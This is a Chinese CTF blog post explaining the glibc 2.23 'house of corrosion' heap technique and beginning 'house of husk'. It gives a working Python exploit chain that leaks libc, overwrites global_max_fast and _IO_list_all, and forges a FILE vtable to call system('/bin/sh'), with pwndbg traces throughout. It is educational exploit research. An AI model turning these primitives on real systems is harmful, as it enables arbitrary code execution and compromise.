---
layout: post
title: 【pwn4heap】glibc2.23其五
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# 【pwn4heap】glibc2.23其五

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-21 house of corrosion

本方法是一种针对glibc内存管理器中`main_arena`结构的`fastbinsY`数组管理机制的特定操作技术。该操作的核心在于，首先需通过 **unsorted bin 操作** 或 **large bin 操作** 等方法，修改全局变量 `global_max_fast` 的值，从而人为扩大 fast bin 所能管理的最大块尺寸阈值。

一旦 `global_max_fast` 被修改，便可释放一个特定大小的堆块，使其本应归入 large bin 或 unsorted bin 的块异常地落入 fast bin 的管理范围。该块的尺寸需满足特定算术关系：`size = (delta * 2) + 0x20 - 0x10`，其中 `delta` 通常表示目标地址与 `main_arena` 中 `fastbinsY` 数组基址之间的偏移。通过精确控制该尺寸，在释放操作时，该块会被链接至 `fastbinsY` 数组中一个由计算得出的索引位置，而该索引实质上指向一个期望控制的任意内存地址。

此后，可通过再次申请相应大小的 fast chunk，触发分配器从被修改的 `fastbinsY` 槽位中取出伪造的链表节点，进而实现向任意地址写入可控数据或从任意地址读取内存内容的目的。该操作得以实现的关键，在于利用了 fast bin 分配逻辑中对 `fastbinsY` 边界校验的缺失，以及通过修改全局阈值使其将超常规块纳入快速分配机制，从而将 `fastbinsY` 数组转化为一个可控的读写原语。这揭示了 glibc 在分配器元数据完整性保护上的设计考量，尤其是在多 bin 类型转换的边界条件下存在的特定情况。

相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3925)

```c
if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
    /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
    */
    && (chunk_at_offset(p, size) != av->top)
#endif
    ) {

  if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
    {
	/* We might not have a lock at this point and concurrent modifications
	   of system_mem might have let to a false positive.  Redo the test
	   after getting the lock.  */
	if (have_lock
	    || ({ assert (locked == 0);
		  mutex_lock(&av->mutex);
		  locked = 1;
		  chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem;
	      }))
	  {
	    errstr = "free(): invalid next size (fast)";
	    goto errout;
	  }
	if (! have_lock)
	  {
	    (void)mutex_unlock(&av->mutex);
	    locked = 0;
	  }
    }

  free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

  set_fastchunks(av);
  unsigned int idx = fastbin_index(size);
  fb = &fastbin (av, idx);

#define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[idx])

/* offset 2 to use otherwise unindexable first 2 bins */
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

在 glibc 2.23 版本的内存管理器中，用于计算 fast bin 索引的 `fastbin_index` 宏存在特定的设计情况。其实现本质上是将 chunk 的尺寸（`size`）参数通过简单的算术右移操作（通常是 `(size) >> (SIZE_SZ == 8 ? 4 : 3)`）转换为数组索引（`idx`）。该设计在当时**缺乏对输入尺寸参数的严格边界校验**，尤其当 `global_max_fast` 全局阈值被修改后，此索引计算过程无法确保结果值落在 `main_arena->fastbinsY` 这个有限大小的数组边界之内。

通过构造一个特定的 chunk 尺寸，可以使计算得出的 `idx` 值远超 `fastbinsY` 数组的合法索引范围。当分配器试图通过 `(ar_ptr)->fastbinsY[idx]` 访问对应的 fast bin 链表时，`idx` 实际上被用作一个可控的偏移量。由于缺乏边界验证，该操作会将 `fastbinsY` 数组的基址加上一个非常大的偏移，从而使原本用于管理空闲堆块的指针域指向一个任意的目标内存地址。这成功将堆管理器的内部数据结构转化为一个可控的读写原语，为后续实现**向任意地址写入**或构建更复杂的操作链提供了条件，反映了早期 glibc 在核心内存管理操作中边界检查机制的设计考量。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/11/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_corrosion/exploit.py)。

核心利用代码如下：

```python
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
# unsorted bin leak
malloc(0, 0xF8, b"A" * 0x8)
malloc(1, 0x18, b"B" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)
malloc(3, 0x18, b"D" * 0x8)
delete(0)
delete(2)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
log.info(f"global_max_fast addr: {hex(libc.sym['global_max_fast'])}")
fastbinsY = libc.sym["main_arena"] + 0x8
log.info(f"fastbinsY addr: {hex(fastbinsY)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# leak heap addr
edit(0, 0x8, b"A" * 0x8)
author_name, introduction, content = show(0)
chunk2_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
chunk0_addr = chunk2_addr - 0x100 - 0x20
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
edit(0, 0x8, p64(main_arena88))
malloc(0, 0xF8, b"A" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)

# house of corrosion
#
# formula: size = (delta * 2) + 0x20 - 0x10
evil_size = (_IO_list_all - fastbinsY) * 2 + 0x20 - 0x10
malloc(4, evil_size, b"E" * 0x8)
malloc(5, 0x60, b"F" * 0x8)
delete(0)
payload = p64(main_arena88) + p64(libc.sym["global_max_fast"] - 0x10)
edit(0, len(payload), payload)
malloc(0, 0xF8, b"A" * 0x8)
delete(4)
edit(4, 0x8, p64(chunk2_addr + 0x10))
malloc(4, evil_size, b"\x00")

# house of orange
fake_io = flat({0x00: b"/bin/sh\x00", 0x20: p64(2), 0x28: p64(3), 0xC0: p64(0), 0xD8: p64(chunk0_addr + 0x10)})
edit(2, len(fake_io), fake_io)
fake_vtable = p64(libc.sym["system"]) * 4
edit(0, len(fake_vtable), fake_vtable)
conn.sendlineafter(b"> ", b"1")
conn.sendlineafter(b"Please input the chunk index: ", b"6")
conn.sendlineafter(b"Please input the size: ", b"16")
conn.recvline()
cmd = b"cat src/2.23/house_of_corrosion/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

本次测试的二进制程序综合运用了多项基于堆的特定操作技术，构建了一条复合技术链。其核心步骤如下：

首先，运用 **unsorted bin 地址泄露** 技术。通过操作未排序块（unsorted bin）的链表结构，获取关键的地址信息，包括 **libc 基址** 和 **堆（heap）基址**。这为后续所有依赖于绝对地址的计算和操作提供了必要的信息基础。

随后，实施 **unsorted bin 操作**。此技术通过修改未排序块中的 `bk` 指针，在特定操作（如 `malloc`）中实现一次向任意地址写入一个大型固定值（`main_arena` 地址）的原语。在此技术链中，其关键目的是成功修改全局变量 `global_max_fast`，从而为下一阶段的操作创造条件。

继而，部署 **house of corrosion** 方法。在 `global_max_fast` 被扩大后，通过释放一个满足特定公式 `size = (delta * 2) + 0x20 - 0x10` 的堆块，使其被链入 `fastbinsY` 数组的预期位置。这成功地将堆管理器的内部数据结构转化为一个可控的**任意地址写**原语，用于修改程序的关键状态或数据。

最终，接入 **house of orange** 技术。该技术核心在于，通过触发特定的异常处理流程来执行预设代码，实现**任意代码执行**。

整个技术链从**信息获取**开始，通过**修改全局状态**、**获得任意写能力**，最终演进到**控制流实现**，层层递进，展示了在特定环境（如 glibc 2.23）中，组合多种底层原语以实现完整操作逻辑的可行性。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x600da0a3a000
Size: 0x100 (with flag bits: 0x101)
fd: 0x7da76ed8db78
bk: 0x600da0a3a120

Allocated chunk
Addr: 0x600da0a3a100
Size: 0x20 (with flag bits: 0x20)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x600da0a3a120
Size: 0x100 (with flag bits: 0x101)
fd: 0x600da0a3a000
bk: 0x7da76ed8db78

Allocated chunk
Addr: 0x600da0a3a220
Size: 0x20 (with flag bits: 0x20)

Top chunk | PREV_INUSE
Addr: 0x600da0a3a240
Size: 0x20dc0 (with flag bits: 0x20dc1)

pwndbg> unsortedbin 
unsortedbin
all: 0x600da0a3a120 —▸ 0x600da0a3a000 —▸ 0x7da76ed8db78 (main_arena+88) ◂— 0x600da0a3a120
pwndbg> 
```

精确计算特定的 **`evil_size`** 值是该方法的关键步骤，其计算公式为：`evil_size = (delta * 2) + 0x20 - 0x10`。

在此公式中，**`delta`** 是一个核心的偏移量，定义为：**`delta = 目标地址 − main_arena->fastbinsY 的基址`**。该计算的目的是，使一个后续将被释放的堆块，能够被精确地链入**任意指定的内存地址**，该地址随后将被视为一个受控的 fast bin 链表头。

其运作原理植根于 `fastbin_index` 宏的运算方式。当释放一个大小为 `evil_size` 的块时，分配器会调用 `fastbin_index(evil_size)` 来计算其在 `fastbinsY` 数组中的索引 `idx`。由于该宏仅执行简单的位运算（`(size) >> 4`），而 `evil_size` 的构造使得 `idx` 的计算结果在数值上恰好等于 `delta`。因此，分配器实际访问的地址为：`&main_arena->fastbinsY[0] + idx = &main_arena->fastbinsY[0] + delta = 目标地址`。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a000
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a100
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a120
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a220
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x600da0a3a240
Size: 0x1450 (with flag bits: 0x1451)  <= evil_size

Top chunk | PREV_INUSE
Addr: 0x600da0a3b690
Size: 0x1f970 (with flag bits: 0x1f971)

pwndbg> 
```

在成功获取 **libc 基址** 后，该技术链的关键一步是执行 **unsorted bin 操作**。此操作通过修改一个位于 unsorted bin 中的空闲块的 `bk`（后向）指针，使其指向目标地址——即全局变量 **`global_max_fast`** 的存储位置。

当分配器后续尝试将此 chunk 从 unsorted bin 中取出并重新整理时，其内部的 `unlink` 操作逻辑会导致向该 chunk 的 `bk` 指针所指向的地址（即 `&global_max_fast`）**写入一个来自 `main_arena` 的较大数值**（通常是一个 libc 中的地址）。此操作成功地将 `global_max_fast` 的值修改为一个远超其正常范围（例如 > 0x80）的数值。

**此修改的根本性影响在于，它实质上移除了 fast bin 分配的常规尺寸限制**。fast bin 的分配路径中固有的安全检查 `if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())` 将因此恒为真，因为任何小于被修改后巨大阈值的 chunk 尺寸（`size`）都能通过校验。这使得本应归类为 small bin 甚至 large bin 的**较大尺寸堆块**，在被释放时被链入 `fastbinsY` 数组，从而为后续基于 `fastbin_index` 索引计算特定行为（如 **house of corrosion**）创造了条件。因此，**unsorted bin 操作在此充当了修改堆分配器全局规则的“开关”**，为后续更复杂的操作提供了可能。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x600da0a3a000 —▸ 0x7da76ed8db78 (main_arena+88) ◂— 0x600da0a3a000
BK: 0x600da0a3a000 —▸ 0x7da76ed8f7c8 (__free_hook) ◂— 0
pwndbg> x/4gx 0x600da0a3a000
0x600da0a3a000: 0x0000000000000000      0x0000000000000101
0x600da0a3a010: 0x00007da76ed8db78      0x00007da76ed8f7c8
pwndbg> x/1gx &global_max_fast 
0x7da76ed8f7d8 <global_max_fast>:       0x0000000000000080
pwndbg> 
```

在技术链的后续步骤中，首先通过 **`malloc`** 申请特定大小的 **`chunks[0]`**。此操作的主要目的是**触发预设的 `unsorted bin` 操作流程**。当分配器尝试从已设置好特定 `bk` 指针的 unsorted bin 中分割或取出对应堆块时，会执行其固有的 `unlink` 操作，从而成功将 `global_max_fast` 的值更新为一个较大的 `main_arena` 地址。

```bash
pwndbg> x/1gx &global_max_fast 
0x7da76ed8f7d8 <global_max_fast>:       0x00007da76ed8db78
pwndbg> 
```

通过调试可验证，**`global_max_fast` 的数值已被显著提升**，这表明堆分配器中 fast bin 管理的全局尺寸阈值已被成功修改，为后续步骤清除了关键限制。

紧接着，释放预先构造的 **`chunks[4]`**。该堆块的尺寸是之前通过公式 `evil_size = (delta * 2) + 0x20 - 0x10` 计算得出的**特定尺寸**。由于 `global_max_fast` 已被扩大，这个尺寸远超常规 fast bin 限制的块在释放时，**被纳入了 fast bin 的管理路径**。分配器将根据其 `evil_size` 计算出一个经过设计的 `fastbin_index` 索引值，并尝试将该块插入 `main_arena->fastbinsY[idx]`。由于该索引 `idx` 被构造为指向一个预设的目标地址，此释放操作**成功使该目标地址成为一个 fast bin 链表头**，从而实现了 **house of corrosion** 的核心机制。这标志着建立了一个**稳定的向指定地址写入（Arbitrary Write）的能力**，即通过堆分配器自身的行为将可控数据写入指定的内存位置。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3886
   3880 
   3881   /*
   3882     If eligible, place chunk on a fastbin so it can be found
   3883     and used quickly in malloc.
   3884   */
   3885 
 ► 3886   if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
   3887 
   3888 #if TRIM_FASTBINS
   3889       /*
   3890         If TRIM_FASTBINS set, don't place chunks
   3891         bordering top into fastbins
   3892       */
   3893       && (chunk_at_offset(p, size) != av->top)
 
pwndbg> p/x size
$1 = 0x1450
pwndbg> p/x global_max_fast 
$2 = 0x7da76ed8db78
pwndbg> 
```

在 glibc 堆管理器的标准操作流程中，当释放一个堆块时，分配器会依据其尺寸执行严格的分支判断。核心条件为 `if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())`。**`chunks[4]` 由于其预先构造的 `evil_size` 远超默认的 `global_max_fast` 阈值（通常为 0x80），在正常情况下该判断条件为假**。因此，它将被路由至 **unsorted bin** 或 **large bin** 等用于管理较大尺寸空闲块的数据结构中进行处理，而**不会进入专为小尺寸、高频分配设计的 fast bin 分配/释放分支**。

然而，前述的 **unsorted bin 操作** 成功修改了全局变量 `global_max_fast`，将其值更新为一个较大的 libc 地址（如 `main_arena` 地址）。这一操作**实质上移除了上述关键条件判断的限制**。修改后，`get_max_fast()` 的返回值变得极大，使得几乎所有合理的块尺寸（包括特制的 `evil_size`）都能满足 `(size) <= (get_max_fast())` 这一不等式。

因此，当释放 `chunks[4]` 时，分配器的执行流**被重新导向了原本不会进入的 fast bin 处理分支**。这标志着不仅修改了一个数据值，更**改变了堆管理器的逻辑执行路径**，使得系统对一个较大块应用了原本为小块设计的、高效的 `fastbinsY` 管理逻辑。此次条件分支的转向，是连接“全局状态修改”与“实现指定地址写能力”的**关键步骤**，为后续基于 `house of corrosion` 方法并利用 `fastbin_index` 计算特性铺平了道路。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3922
   3916           {
   3917             (void)mutex_unlock(&av->mutex);
   3918             locked = 0;
   3919           }
   3920       }
   3921 
 ► 3922     free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
```

在释放特制的 **`chunks[4]`** 并进入 fast bin 处理路径后，其执行流需要通过 `_int_free` 函数中的两项关键完整性校验：

1.  **`__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)`**：此校验旨在防止与**物理相邻的下一个堆块（next chunk）** 发生非预期的前向合并。它检查目标堆块相邻的下一个堆块的 `size` 字段是否大于最小阈值（`2 * SIZE_SZ`），以确认其具有一个有效的堆块头部结构。

2.  **`__builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)`**：此校验用于检测堆块大小的**合理性**。它验证相邻下一个堆块的 `size` 值是否未超过分配区（`arena`）所记录的总系统内存（`system_mem`），以防止异常巨大的、不合理的尺寸值被接受。

在此特定操作中，通过**精心的内存布局安排**，已预先确保 **`chunks[4]` 物理相邻的下一个堆块（或对应内存区域）的 `size` 字段** 被设置为一个既大于最小阈值、又远小于 `system_mem` 的**合理值**。因此，这两项旨在维护堆完整性的安全检查，在构造的特定内存状态下被**确定性地满足**，使得执行流能够按预期继续。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3926
   3920       }
   3921 
   3922     free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
   3923 
   3924     set_fastchunks(av);
   3925     unsigned int idx = fastbin_index(size);
 ► 3926     fb = &fastbin (av, idx);
   3927 
   3928     /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
   3929     mchunkptr old = *fb, old2;
   3930     unsigned int old_idx = ~0u;
   3931     do
   3932       {
   3933         /* Check that the top of the bin is not the record we are going to add
 
pwndbg> p/x size
$3 = 0x1450
pwndbg> p/x (0x1450>>4)-2
$4 = 0x143
pwndbg> p/x idx
$5 = 0x143
pwndbg> p/x &main_arena->fastbinsY[0x143]
$6 = 0x7da76ed8e540
pwndbg> x/1gx 0x7da76ed8e540
0x7da76ed8e540 <__GI__IO_list_all>:     0x00007da76ed8e560
pwndbg> 
```

在成功释放特定构造的 **evil_size** 堆块后，**house of corrosion** 机制的核心效果得以实现。通过对 `evil_size` 的精确计算，使得 `fastbin_index(evil_size)` 宏产生了一个非常大的索引值 **`0x143`**。此时，堆管理器的内部状态 `main_arena->fastbinsY[0x143]` 已不再指向一个位于常规堆或 `main_arena` 结构内部的 fast bin 链表头。由于计算出的偏移，该指针**实际指向了 libc 中的全局符号 `_IO_list_all` 的地址**，从而将文件流链表头结构“链接”为一个待处理的 fast bin。

随后，当执行流试图将该释放的堆块插入此 fast bin 链表时，会进入以下同步操作循环：
`while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);`

此语句是 **`catomic_compare_and_exchange_val_rel`** 宏（一种**原子化的比较并交换**操作）的应用，旨在**确保在并发环境下修改 `fb`（即 `fastbinsY[0x143]`）指针的线程安全性**。其逻辑是：原子地比较目标位置 `fb` 的当前值是否等于预期值 `old2`；如果相等，则将其更新为新值 `p`（即被释放堆块的地址）；如果不相等，则循环重试。在此次操作的**单线程**环境下，该操作**实质上执行了一次确定性的原子写入**：将 **`_IO_list_all` 指针的值更新为当前释放堆块的地址**。

这一步骤标志着操作从**建立指定地址写入能力**，进展到**实际修改关键的控制流相关数据结构**。通过将 `_IO_list_all` 指向一个可控的堆块，为后续构造 `_IO_FILE_plus` 结构体（**house of orange** 技术的核心）并最终通过 `_IO_flush_all_lockp` 等函数执行预设代码，完成了必要的数据准备。此次原子操作的成功，是连接内存操作与控制流实现的**关键步骤**。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3948
   3942            only if we have the lock, otherwise it might have already been
   3943            deallocated.  See use of OLD_IDX below for the actual check.  */
   3944         if (have_lock && old != NULL)
   3945           old_idx = fastbin_index(chunksize(old));
   3946         p->fd = old2 = old;
   3947       }
 ► 3948     while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
 
pwndbg> x/1gx &_IO_list_all
0x7da76ed8e540 <__GI__IO_list_all>:     0x0000600da0a3a240
pwndbg> p/x chunks[4]
$7 = {
  size = 0x1440,
  addr = 0x600da0a3a250
}
pwndbg> x/4gx 0x600da0a3a250-0x10
0x600da0a3a240: 0x0000000000000000      0x0000000000001451
0x600da0a3a250: 0x00007da76ed8e560      0x0000000000000000
pwndbg> 
```

在 **`catomic_compare_and_exchange_val_rel`** 原子操作的循环结束后，通过调试器或内存检查工具可以明确验证，**关键全局指针 `_IO_list_all` 的值已被成功更新**。其原有的、指向 `_IO_FILE_plus` 结构链表的地址，已被**原子性地替换**为可控的堆块地址 **`0x0000600da0a3a240`**，这正是**`chunks[4]`** 的起始地址。

```bash
pwndbg> x/4gx 0x600da0a3a250-0x10
0x600da0a3a240: 0x0000000000000000      0x0000000000001451
0x600da0a3a250: 0x0000600da0a3a130      0x0000000000000000
pwndbg> 
```

此时，通过 **`malloc(evil_size)`** 申请一块与之前释放的 **`chunks[4]`** 尺寸相同的内存。此操作将触发 **`house of orange`** 技术链中的**第二种关键写入原语**，它与之前 **`free`** 操作触发的**第一种写入原语**共同构成了完整的操作序列：

1.  **第一种写入原语（由 `free` 触发）**：如前所述，在 **`house of corrosion`** 阶段，释放特定构造的 `evil_size` chunk 时，通过被特意计算的 `fastbinsY` 槽位索引，利用原子操作 **`catomic_compare_and_exchange_val_rel`** 将目标地址（此处为 **`_IO_list_all`**）的值修改为该释放块的地址。此原语**实现了向指定地址写入一个可控的堆地址**。

2.  **第二种写入原语（由此次 `malloc` 触发）**：当调用 **`malloc(evil_size)`** 时，分配器会根据 `evil_size` 计算出相同的大索引，并尝试从 `fastbinsY[0x143]`（即现在指向 **`_IO_list_all`** 的指针位置）所代表的链表中分配一个块。由于该位置当前存储的是 `chunks[4]` 的地址，分配器会视其为一个空闲的 fast chunk，并将其从链表中取出并返回给调用者。**关键之处在于，这个“取出”操作在逻辑上等同于将 `_IO_list_all` 指针的值更新为该伪造链表中的下一个“节点”的地址**。通过预先在 `chunks[4]` 的内存布局中设置好一个 `fd`（前向指针）值，此次分配操作会**原子性地将 `_IO_list_all` 的值更新为该预设的 `fd` 值**，从而实现**又一次向该关键全局地址的可控写入**。

因此，**`free` 与 `malloc` 的这一对操作，共同构成了对 `_IO_list_all` 指针的连续两次可控写入**。第一次写入将其指向可控的堆内存，为后续构造 `_IO_FILE_plus` 结构奠定基础；第二次写入则可用于精确调整该指针或配合伪造的结构体布局，最终使得在触发 `_IO_flush_all_lockp` 等标准例程时，能够按预期执行预设的函数指针，完成控制流导向。这两种原语前后衔接，是 **`house of orange`** 技术在现代 glibc 环境中实现其目标的核心步骤。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3372
   3366    */
   3367 
   3368   if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
   3369     {
   3370       idx = fastbin_index (nb);
   3371       mfastbinptr *fb = &fastbin (av, idx);
 ► 3372       mchunkptr pp = *fb;
   3373       do
   3374         {
   3375           victim = pp;
   3376           if (victim == NULL)
   3377             break;
   3378         }
   3379       while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
   
pwndbg> p/x fb
$9 = 0x7da76ed8e540
pwndbg> x/1gx fb
0x7da76ed8e540 <__GI__IO_list_all>:     0x0000600da0a3a240
pwndbg> 
```

准备修改_IO_list_all修改内容。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3380
   3374         {
   3375           victim = pp;
   3376           if (victim == NULL)
   3377             break;
   3378         }
   3379       while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
 ► 3380              != victim);
   3381       if (victim != 0)
   
pwndbg> x/1gx &_IO_list_all
0x7da76ed8e540 <__GI__IO_list_all>:     0x0000600da0a3a130
pwndbg> p/x victim
$10 = 0x600da0a3a240
pwndbg> 
```

可以发现_IO_list_all已经成功将其从0x0000600da0a3a240修改为0x0000600da0a3a130，并将victim返回用户。

```bash
pwndbg> x/10gx chunks
0x600d877c10c0 <chunks>:        0x00000000000000f8      0x0000600da0a3a010
0x600d877c10d0 <chunks+16>:     0x0000000000000018      0x0000600da0a3a110
0x600d877c10e0 <chunks+32>:     0x00000000000000f8      0x0000600da0a3a130
0x600d877c10f0 <chunks+48>:     0x0000000000000018      0x0000600da0a3a230
0x600d877c1100 <chunks+64>:     0x0000000000001440      0x0000600da0a3a250
pwndbg> 
```

当前，全局指针 **`_IO_list_all`** 已被成功修改为指向堆块 **`chunks[2]`** 的地址。计划在 **`chunks[0]`** 和 **`chunks[2]`** 这两个可控的内存区域上，协同构造一个完整的、用于 **house of orange** 技术的伪造 **`_IO_FILE_plus`** 结构体系。

```bash
pwndbg> p/x *_IO_list_all
$12 = {
  file = {
    _flags = 0x6e69622f,
    _IO_read_ptr = 0x6161616461616163,
    _IO_read_end = 0x6161616661616165,
    _IO_read_base = 0x6161616861616167,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x6161616e6161616d,
    _IO_buf_base = 0x616161706161616f,
    _IO_buf_end = 0x6161617261616171,
    _IO_save_base = 0x6161617461616173,
    _IO_backup_base = 0x6161617661616175,
    _IO_save_end = 0x6161617861616177,
    _markers = 0x6261617a61616179,
    _chain = 0x6261616362616162,
    _fileno = 0x62616164,
    _flags2 = 0x62616165,
    _old_offset = 0x6261616762616166,
    _cur_column = 0x6168,
    _vtable_offset = 0x61,
    _shortbuf = {0x62},
    _lock = 0x6261616b6261616a,
    _offset = 0x6261616d6261616c,
    _codecvt = 0x6261616f6261616e,
    _wide_data = 0x6261617162616170,
    _freeres_list = 0x6261617362616172,
    _freeres_buf = 0x6261617562616174,
    __pad5 = 0x6261617762616176,
    _mode = 0x0,
    _unused2 = {0x0, 0x0, 0x0, 0x0, 0x7a, 0x61, 0x61, 0x63, 0x62, 0x61, 0x61, 0x63, 0x63, 0x61, 0x61, 0x63, 0x64, 0x61, 0x61, 0x63}
  },
  vtable = 0x600da0a3a010
}
pwndbg> p/x *_IO_list_all.vtable
$13 = {
  __dummy = 0x7da76ea3c3eb,
  __dummy2 = 0x7da76ea3c3eb,
  __finish = 0x7da76ea3c3eb,
  __overflow = 0x7da76ea3c3eb,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> 
```

任意申请一次内存，触发malloc_printerr。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3475
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
   3472           bck = victim->bk;
   3473           if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
   3474               || __builtin_expect (victim->size > av->system_mem, 0))
 ► 3475             malloc_printerr (check_action, "malloc(): memory corruption",
   3476                              chunk2mem (victim), av);
```

进而进入_IO_flush_all_lockp函数，触发_IO_OVERFLOW函数。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
pwndbg> x/s fp
0x600da0a3a130: "/bin/sh"
pwndbg> 
```

获取shell控制权近在眼前了。


### 1-22 house of husk其一

本方法是一种基于 glibc 中 **`printf` 系列函数自定义格式说明符**机制的特定操作技术。其初始步骤与 **House of Corrosion** 共享相同的核心算术原语：通过公式 **`size = (delta * 2) + 0x20 - 0x10`** 构造特定尺寸的堆块，以利用 `fastbin_index` 的索引计算特性，实现一次**可控的指定地址写**。

然而，两者的最终目标和**被操作的关键数据结构**截然不同。**House of Husk 其一** 的操作焦点在于 glibc 内部两个用于扩展 `printf` 功能的全局函数指针表：
*   **`__printf_function_table`**：一个指针，指向一个记录用户自定义格式说明符信息的结构。
*   **`__printf_arginfo_table`**：一个指针，指向一个与上述自定义格式符对应的**函数指针数组**，数组中的每个元素应为处理对应格式符的 `arginfo` 函数地址。

该技术的核心运作机制基于 glibc 中 `printf` 的实现特性：当 **`__printf_function_table`** 不为 **`NULL`** 时，`printf` 在解析格式字符串时，会查询此表以检查是否存在自定义格式符（如 `%N`）。若存在，则会进一步从 **`__printf_arginfo_table`** 所指向的数组中，根据该格式符的索引取出对应的函数指针并执行。

因此，**House of Husk 其一** 的操作路径是：首先，利用上述公式提供的地址写能力，将 **`__printf_function_table`** 指针修改为一个非空值（通常指向一个可控的内存区域，其中布置了预设的自定义格式符记录）。然后，更重要的是，将 **`__printf_arginfo_table`** 指针修改为指向一个完全可控的、伪造的“函数指针数组”。通过在该伪造数组中，将目标自定义格式符（如 `%N`）对应的索引位置设置为 **system** 或 **one_gadget** 等目标函数的地址，当后续程序调用 `printf` 并包含该格式符（如 `%N$n`）时，便会触发对该预设函数指针的调用，从而**实现从格式化字符串解析到控制流导向的转换**。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/13/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_husk/exploit.py)。

核心利用代码如下：

```python
FASTBIN_Y = libc.symbols["main_arena"] + 0x8
GLOBAL_MAX_FAST = libc.symbols["global_max_fast"]
PRINTF_FUNCTABLE = libc.symbols["__printf_function_table"]
